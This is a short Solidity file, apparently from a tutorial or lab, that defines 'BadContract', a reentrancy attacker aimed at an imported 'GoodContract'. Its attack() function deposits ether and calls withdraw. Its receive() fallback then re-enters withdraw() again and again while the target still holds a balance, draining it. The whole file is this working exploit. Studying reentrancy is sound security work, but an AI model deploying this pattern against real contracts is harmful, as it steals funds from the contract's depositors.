// SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

import './GoodContract.sol';

contract BadContract {
    GoodContract public goodContract; 

    constructor(address _goodContractAddress) {
        goodContract = GoodContract(_goodContractAddress);
    }

    // Function to receive ether
    receive() external payable {
        if (address(goodContract).balance > 0) {
            goodContract.withdraw();
        }
    }
    // start the attack
    function attack() public payable {
        goodContract.deposit{value: msg.value}();
        goodContract.withdraw();
    }
}